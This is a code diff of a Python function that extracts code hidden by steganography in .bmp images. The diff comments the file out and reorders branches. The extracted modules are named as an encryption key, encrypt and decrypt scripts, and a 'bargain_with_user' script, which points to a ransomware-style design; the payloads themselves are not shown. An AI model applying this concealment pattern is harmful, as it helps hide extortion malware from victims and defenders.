@@ -1,5 +1,5 @@
-import subprocess
-import os
+'''#import subprocess
+#import os
 
 
 def extract_file(cover_file_path: str, passphrase: str):
@@ -45,10 +45,10 @@ def extract_file(cover_file_path: str, passphrase: str):
         extracted_file = "key.txt"
     elif cover_file_path == image_containing_encryption_code:  # our .bmp file containing the logic to encrypt
         extracted_file = "encrypt.py"
-    elif cover_file_path == image_containing_decryption_code:  # our .bmp file containing the logic to decrypt
-        extracted_file = "decrypt.py"
     elif cover_file_path == image_containing_bargaining_code:
         extracted_file = "bargain_with_user.py"
+    elif cover_file_path == image_containing_decryption_code:  # our .bmp file containing the logic to decrypt
+        extracted_file = "decrypt.py"
     else:
         raise FileNotFoundError("Unexpected file name passed as cover file. "
                                 "Try updating the name of the variable 'cover_file_path'")
@@ -108,3 +108,4 @@ def extract_file(cover_file_path: str, passphrase: str):
 
     # Returns the embedded code in a string format
     return contents
+'''
